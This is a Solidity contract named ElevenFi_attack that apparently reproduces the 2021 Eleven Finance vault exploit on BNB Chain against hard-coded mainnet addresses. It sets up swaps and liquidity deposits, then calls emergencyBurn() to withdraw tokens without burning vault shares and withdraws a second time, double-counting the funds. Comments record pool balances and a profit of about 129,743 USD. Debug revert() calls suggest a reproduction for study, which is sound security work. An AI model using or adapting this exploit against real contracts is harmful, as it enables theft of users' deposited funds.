// SPDX-License-Identifier: AGPL-3.0-or-later

// The ABI encoder is necessary, but older Solidity versions should work
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

//Timestamp  	2021-06-23 02:11:22(UTC)
//Block number 	8534790
//Gas limit  	10000000
//Gas used  2036900
// tx: 0x16c87d9c4eb3bc6c4e5fbba789f72e8bbfc81b3403089294a81f31b91088fc2f



interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IWBNB is IBEP20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}


interface IPancakeRouter {
  function WETH (  ) external view returns ( address );
  function addLiquidity ( address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB, uint256 liquidity );
  function addLiquidityETH ( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );
  function factory (  ) external view returns ( address );
  function getAmountIn ( uint256 amountOut, uint256 reserveIn, uint256 reserveOut ) external pure returns ( uint256 amountIn );
  function getAmountOut ( uint256 amountIn, uint256 reserveIn, uint256 reserveOut ) external pure returns ( uint256 amountOut );
  function getAmountsIn ( uint256 amountOut, address[] calldata path ) external view returns ( uint256[] memory amounts ); 
  function getAmountsOut ( uint256 amountIn, address[] calldata path ) external view returns ( uint256[] memory amounts );
  function quote ( uint256 amountA, uint256 reserveA, uint256 reserveB ) external pure returns ( uint256 amountB );
  function removeLiquidity ( address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB );
  function removeLiquidityETH ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountToken, uint256 amountETH );
  function removeLiquidityETHSupportingFeeOnTransferTokens ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountETH );
  function removeLiquidityETHWithPermit ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountToken, uint256 amountETH );
  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountETH );
  function removeLiquidityWithPermit ( address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountA, uint256 amountB );
  function swapETHForExactTokens ( uint256 amountOut, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactETHForTokens ( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactETHForTokensSupportingFeeOnTransferTokens ( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
  function swapExactTokensForETH ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactTokensForETHSupportingFeeOnTransferTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
  function swapExactTokensForTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactTokensForTokensSupportingFeeOnTransferTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
  function swapTokensForExactETH ( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapTokensForExactTokens ( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
}


interface IMetaSwapDeposit {
  function addLiquidity ( uint256[] calldata amounts, uint256 minToMint, uint256 deadline ) external returns ( uint256 );
  function baseSwap (  ) external view returns ( address );
  function baseTokens ( uint256 ) external view returns ( address );
  function calculateRemoveLiquidity ( address account, uint256 amount ) external view returns ( uint256[] memory );
  function calculateRemoveLiquidityOneToken ( address account, uint256 tokenAmount, uint8 tokenIndex ) external view returns ( uint256 );
  function calculateSwap ( uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx ) external view returns ( uint256 );
  function calculateTokenAmount ( address account, uint256[] calldata amounts, bool deposit ) external view returns ( uint256 );
  function getToken ( uint256 index ) external view returns ( address );
  function initialize ( address _baseSwap, address _metaSwap, address _metaLPToken ) external;
  function metaLPToken (  ) external view returns ( address );
  function metaSwap (  ) external view returns ( address );
  function metaTokens ( uint256 ) external view returns ( address );
  function removeLiquidity ( uint256 amount, uint256[] calldata minAmounts, uint256 deadline ) external returns ( uint256[] memory );
  function removeLiquidityImbalance ( uint256[] calldata amounts, uint256 maxBurnAmount, uint256 deadline ) external returns ( uint256 );
  function removeLiquidityOneToken ( uint256 tokenAmount, uint8 tokenIndex, uint256 minAmount, uint256 deadline ) external returns ( uint256 );
  function swap ( uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline ) external returns ( uint256 );
  function tokens ( uint256 ) external view returns ( address );
}


interface IElevenNeverSellVault {
  function allowance ( address owner, address spender ) external view returns ( uint256 );
  function approve ( address spender, uint256 amount ) external returns ( bool );
  function available (  ) external view returns ( uint256 );
  function balance (  ) external view returns ( uint256 );
  function balanceOf ( address account ) external view returns ( uint256 );
  function bpsFee (  ) external view returns ( uint256 );
  function buybackstrat (  ) external view returns ( address );
  function changeBpsFee ( uint256 _fee ) external;
  function claimRewards (  ) external;
  function convertTo11nrvStrat (  ) external view returns ( address );
  function decimals (  ) external view returns ( uint8 );
  function decreaseAllowance ( address spender, uint256 subtractedValue ) external returns ( bool );
  function deposit ( uint256 _amount ) external;
  function depositAll (  ) external;
  function disableTesting (  ) external;
  function ele (  ) external view returns ( address );
  function elePid (  ) external view returns ( uint256 );
  function elechef (  ) external view returns ( address );
  function emergencyBurn (  ) external;
  function getPricePerFullShare (  ) external pure returns ( uint256 );
  function harvest (  ) external;
  function harvested11nrvPerShare (  ) external view returns ( uint256 );
  function harvested11nrvPerUser ( address ) external view returns ( uint256 );
  function harvestedElePerShare (  ) external view returns ( uint256 );
  function harvestedElePerUser ( address ) external view returns ( uint256 );
  function harvesters ( address ) external view returns ( bool );
  function increaseAllowance ( address spender, uint256 addedValue ) external returns ( bool );
  function insideChef (  ) external view returns ( uint256 );
  function mastermind (  ) external view returns ( address );
  function name (  ) external view returns ( string memory );
  function nrv (  ) external view returns ( address );
  function nrv11 (  ) external view returns ( address );
  function owner (  ) external view returns ( address );
  function pendingEleven ( address _user ) external view returns ( uint256 );
  function pendingNerve ( address _user ) external view returns ( uint256 );
  function recoverDummy (  ) external;
  function renounceOwnership (  ) external;
  function setBuybackStrat ( address _add ) external;
  function setConvertStrat ( address _add ) external;
  function setDummyToken ( address _add, uint256 _pid ) external;
  function setHarvestor ( address _add, bool _bool ) external;
  function symbol (  ) external view returns ( string memory );
  function token (  ) external view returns ( address );
  function totalSupply (  ) external view returns ( uint256 );
  function transfer ( address recipient, uint256 amount ) external returns ( bool );
  function transferFrom ( address sender, address recipient, uint256 amount ) external returns ( bool );
  function transferOwnership ( address newOwner ) external;
  function update11Nrv (  ) external;
  function updateEle (  ) external;
  function withdraw ( uint256 _shares ) external;
  function withdrawAll (  ) external;
  function xnrv (  ) external view returns ( address );
}




contract ElevenFi_attack {
    address private EOA;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    address private PancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private MetaSwapDepositAddress = 0xC924A8a789d7FafD089cc285e2546FC851b0942c;

    address private nrvFUSDTAddress = 0x2e91A0CECf28c5E518bB2E7fdcd9F8e2cd511c10;
    address private ElevenNeverSellVaultAddress = 0x030970f2378748Eca951ca5b2f063C45225c8f6c;

    address private SwapAddress = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;  // where BSDU comes from and goes to


    IWBNB WBNB = IWBNB(WBNBAddress);
    IBEP20 BUSD = IBEP20(BUSDAddress);
    IBEP20 nrvFUSDT = IBEP20(nrvFUSDTAddress);
    IPancakeRouter PancakeRouter = IPancakeRouter(PancakeRouterAddress);
    IMetaSwapDeposit MetaSwapDeposit = IMetaSwapDeposit(MetaSwapDepositAddress);
    IElevenNeverSellVault ElevenNeverSellVault = IElevenNeverSellVault(ElevenNeverSellVaultAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    uint balance;
    uint[] amounts = new uint[](4);


    constructor() payable {
        require(msg.value == 500 * 10 ** 18, "loan amount does not match");
        WBNB.deposit{value: 500 * 10 ** 18}();
        WBNB.approve(PancakeRouterAddress, 2**256 - 1);
        BUSD.approve(PancakeRouterAddress, 2 ** 256 - 1);
        BUSD.approve(MetaSwapDepositAddress, 2 ** 256 - 1);
        nrvFUSDT.approve(ElevenNeverSellVaultAddress, 2 ** 256 - 1);
        nrvFUSDT.approve(MetaSwapDepositAddress, 2 ** 256 - 1);

        EOA = msg.sender;
    }

    receive() external payable {}


    // flashloan amount: 130,000  000,000,000,000,000,000 BUSD
    function attack0(uint aa, uint bb, uint cc, uint dd) public {

        address[] memory ad = new address[](2);
        ad[0] = WBNBAddress;
        ad[1] = BUSDAddress;
        PancakeRouter.swapExactTokensForTokens(500 * 10 ** 18, 0, ad, address(this),  16218925690);

        // 141298 430713520163660903
        // ----------------------------------Now we have enough initial fund ------------------------------


        // Action 1: BUSD -> nrvFUSDT     State: MetaSwapDeposit(hard to find the state)
        //           State: MetaSwapDeposit(hard to find the state)

        uint nrvFUSDTgot = nrvFUSDT.balanceOf(address(this));
        str3 = MetaSwapDepositSummary();

        amounts[0] = 0;
        amounts[1] = 130001 * 10 ** 18;
        amounts[2] = 0;
        amounts[3] = 0;
        MetaSwapDeposit.addLiquidity(amounts, 0, 16244148820);
        nrvFUSDTgot = nrvFUSDT.balanceOf(address(this)) - nrvFUSDTgot;
        str4 = MetaSwapDepositSummary();

        revert(appendWithSpace(append(str3, str4), uint2str(nrvFUSDTgot / 1e18)));

        // BUSD balance:  65075924 nrvFUSDT total supply:  13814771
        // BUSD balance:  65205925 nrvFUSDT total supply:  13945719 
        // 130947
    



        // Action 2: Deposit: nrvFUSDT -> 11nrvFUSDT      State: ElevenNeverSellVault
        //           State: ElevenNeverSellVault

        // uint llnrvFUSDTgot = ElevenNeverSellVault.balanceOf(address(this));  // 11nrvFUSDT

        ElevenNeverSellVault.deposit( 130947e18 );


        // llnrvFUSDTgot = ElevenNeverSellVault.balanceOf(address(this)) - llnrvFUSDTgot;  // 11nrvFUSDT

        // revert(uint2str(llnrvFUSDTgot / 1e18));  1:1
        // 130947



        // Action 3: Emergency Burn: 11nrvFUSDT(0) -> nrvFUSDT      State: ElevenNeverSellVault
        //           State: ElevenNeverSellVault

        // Execute emergencyBurn() function, withdrawing $nrvFUSDT without burning $11nrvFUSDT

        // uint nrvGot = nrvFUSDT.balanceOf(address(this));
        
        ElevenNeverSellVault.emergencyBurn(); 

        // nrvGot = nrvFUSDT.balanceOf(address(this)) - nrvGot;
        // revert(uint2str(nrvGot / 1e18 ));
        // 130947


        // Action 4: 11nrvFUSDT -> nrvFUSDT    State: ElevenNeverSellVault
        //           State: ElevenNeverSellVault

        // Withdraw $nrvFUSDT from ElevenNeverSellVault contract by burning $11nrvFUSDT
        // 130947   e18

        // uint nrvFUSDTgot = nrvFUSDT.balanceOf(address(this));
        ElevenNeverSellVault.withdraw(130947e18);
        // nrvFUSDTgot = nrvFUSDT.balanceOf(address(this)) - nrvFUSDTgot;
        // revert(uint2str(nrvFUSDTgot / 1e18 ));
        // 130947   e18


        // uint balance = nrvFUSDT.balanceOf(address(this));
        // revert(uint2str(balance / 1e18)); 
        // // 261894e18


        // Action 5: nrvFUSDT -> BUSD     State: MetaSwapDeposit
        //           State: MetaSwapDeposit


        str3 = MetaSwapDepositSummary();
        uint BUSDgot = BUSD.balanceOf(address(this));
        
        MetaSwapDeposit.removeLiquidityOneToken(261894e18, 1, 0, 16244148820); 

        BUSDgot = BUSD.balanceOf(address(this)) - BUSDgot;
        str4 = MetaSwapDepositSummary();
        revert(appendWithSpace(append(str3, str4), uint2str(BUSDgot / 1e18)));
        // BUSD balance:  65205925 nrvFUSDT total supply:  13945719
        // BUSD balance:  64946182 nrvFUSDT total supply:  13683825 
        // 259742 


        revert(ProfitSummary());
        // 271040
        // Total profit: 129743 123910065379284966 USD
        // BUSD balance need to minus 141298

    }



    function ProfitSummary() internal returns (string memory _uintAsString)  {
        str1 = uint2str( BUSD.balanceOf(address(this) ) / 10 ** 18);
        return  append("BUSD Balance: ", str1); // need to - 141298 to get final profit
    }


    function MetaSwapDepositSummary() internal returns (string memory _uintAsString2) {
        uint balance = BUSD.balanceOf(SwapAddress) / 1e18;
        uint balance2 = nrvFUSDT.totalSupply() / 1e18;
        return appendWithSpace(appendWithSpace("BUSD balance: ", uint2str(balance)), appendWithSpace("nrvFUSDT total supply: ", uint2str(balance2)));
    }


    function uint2str(uint _i) internal returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    function toString(address account) internal pure returns(string memory) {
        return toString(abi.encodePacked(account));
    }

    function toString(bytes memory data) internal pure returns(string memory) {
        bytes memory alphabet = "0123456789abcdef";

        bytes memory str = new bytes(2 + data.length * 2);
        str[0] = "0";
        str[1] = "x";
        for (uint i = 0; i < data.length; i++) {
            str[2+i*2] = alphabet[uint(uint8(data[i] >> 4))];
            str[3+i*2] = alphabet[uint(uint8(data[i] & 0x0f))];
        }
        return string(str);
    }



}